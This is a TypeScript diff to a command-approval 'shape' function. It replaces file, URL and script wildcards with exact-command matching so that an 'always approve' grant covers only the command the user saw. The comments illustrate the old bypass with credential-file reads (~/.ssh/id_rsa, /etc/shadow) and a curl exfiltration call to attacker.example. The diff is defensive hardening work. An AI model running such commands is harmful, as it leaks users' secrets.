@@ -4,31 +4,45 @@
  *
  * Algorithm:
  *   - argv[0] is kept verbatim (the executable).
- *   - For each subsequent arg:
- *       • If it looks like a flag (-x, --long), keep verbatim.
- *       • If it looks like a URL, replace with <URL>.
- *       • If it contains a / or starts with ~, ends with a recognizable
- *         file extension, or is an absolute path — replace with <FILE>
- *         (or <DIR> for trailing-slash / known dir-shaped args).
- *       • Otherwise keep verbatim (subcommand names, constants).
- *   - Special case: `bash -c "<script>"` collapses to `bash -c <SCRIPT>`.
+ *   - Every subsequent arg is kept VERBATIM (whitespace-normalized).
+ *   - Special case: `bash -c "<script>"` binds to the exact normalized script.
  *
  * Examples:
- *   ["cat", "/Users/g/Downloads/foo.txt"]    → "cat <FILE>"
- *   ["ls", "-la", "/Users/g/Downloads"]      → "ls -la <DIR>"
+ *   ["cat", "/Users/g/Downloads/foo.txt"]    → "cat /Users/g/Downloads/foo.txt"
+ *   ["ls", "-la", "/Users/g/Downloads"]      → "ls -la /Users/g/Downloads"
  *   ["git", "status"]                        → "git status"
- *   ["curl", "-s", "https://api.x.com/foo"]  → "curl -s <URL>"
- *   ["bash", "-c", "ls | wc -l"]             → "bash -c <SCRIPT>"
+ *   ["curl", "-s", "https://api.x.com/foo"]  → "curl -s https://api.x.com/foo"
+ *   ["bash", "-c", "ls | wc -l"]             → "bash -c: ls | wc -l"
  *
  * Ported from the old Cortex automation family (carryover-audit A8); pure, zero-import.
  *
- * DEVIATION (Codex G8, RUN_LOG): the old A8 collapsed EVERY `bash -c <script>` to one shape
+ * DEVIATION 1 (Codex G8, RUN_LOG): the old A8 collapsed EVERY `bash -c <script>` to one shape
  * `bash -c <SCRIPT>`, so approving one benign shell command with "always" silently approved ALL
  * future shell scripts (arbitrary local code execution past the consent gate). A shell script
- * body is arbitrary code — there is no safe "class" to wildcard — so the shape now binds to the
- * EXACT normalized script: "always" only re-approves the identical script; a different script is a
- * distinct shape that re-prompts. Stronger than the carried behavior; the consent MECHANISM
- * (shape → approval lookup) is unchanged.
+ * body is arbitrary code — there is no safe "class" to wildcard — so the shape binds to the
+ * EXACT normalized script.
+ *
+ * DEVIATION 2 (Cofre J-7, 2026-07-28): the SAME reasoning finishes the job. `<FILE>`, `<DIR>` and
+ * `<URL>` were the identical mistake wearing a narrower mask:
+ *
+ *   - approving `cat ~/notes.txt` stored `cat <FILE>`, which then matched `cat ~/.ssh/id_rsa`,
+ *     `cat ~/.aws/credentials`, `cat /etc/shadow` — every file the granted roots reach;
+ *   - approving `curl -s https://api.stripe.com/v1/x` stored `curl -s <URL>`, which then matched
+ *     `curl -s https://attacker.example/?d=...` — an approved EXFILTRATION primitive.
+ *
+ * A path is not a safe class and a URL is even less of one, so there is nothing left to wildcard:
+ * the shape is now the exact command. "Approve always" means "always run THIS command", which is
+ * also what the consent dialog already showed the user — the old shape silently approved a
+ * category the user was never shown.
+ *
+ * Consequence, deliberately not smoothed over: pre-existing approvals stored in the wildcard form
+ * can no longer match anything, and `consent.ts` refuses them explicitly rather than leaving them
+ * to match by accident. Users re-approve; over-broad grants do not survive the fix.
+ *
+ * Privacy note: a stored shape now contains real paths and URLs. That store is owner-scoped and is
+ * never model-bound — the shape reaches the consent dialog and the owner's own approvals list, and
+ * nothing else. The alternative (keep wildcarding to avoid storing a path) trades the user's
+ * private files for the tidiness of the record, which is the wrong way round.
  */
 export function computeCommandShape(argv: string[]): string {
   if (argv.length === 0) return '';
@@ -49,22 +63,24 @@ export function computeCommandShape(argv: string[]): string {
   return parts.join(' ');
 }
 
+/**
+ * Whitespace-normalize an argument and otherwise keep it EXACTLY. See DEVIATION 2 above: there is
+ * no argument class that can be safely wildcarded, so this no longer generalises anything. It
+ * remains a function because normalization (collapsing internal whitespace so `cat  a.txt` and
+ * `cat a.txt` are one shape rather than two prompts) is still worth doing, and because the shape
+ * computation is the single place a future generalisation would have to be argued for.
+ */
 function normalizeArg(arg: string): string {
-  if (arg.startsWith('-')) return arg;                      // flag
+  return arg.replace(/\s+/g, ' ').trim();
+}
 
-  if (/^https?:\/\//.test(arg)) return '<URL>';             // URL
-  if (/^[a-z][a-z0-9+\-.]*:\/\//i.test(arg)) return '<URL>';
+/** The placeholders the pre-J-7 shape used. A stored shape containing one is an over-broad legacy
+ *  approval: it can never be produced again, and `consent.ts` refuses to match it. */
+export const LEGACY_WILDCARDS = ['<FILE>', '<DIR>', '<URL>', '<SCRIPT>'] as const;
 
-  if (arg.startsWith('~') || arg.startsWith('/') || arg.includes('/')) {
-    if (arg.endsWith('/')) return '<DIR>';
-    if (/\.[a-zA-Z0-9]{1,8}$/.test(arg)) return '<FILE>';
-    // Heuristic: ends with a name and no extension → directory
-    return '<DIR>';
-  }
-
-  if (/\.[a-zA-Z0-9]{1,8}$/.test(arg)) return '<FILE>';     // bare filename with ext
-
-  return arg;                                               // subcommand / literal
+/** True when a stored shape came from the pre-J-7 wildcarding scheme. */
+export function isLegacyWildcardShape(shape: string): boolean {
+  return LEGACY_WILDCARDS.some((w) => shape.includes(w));
 }
 
 /**
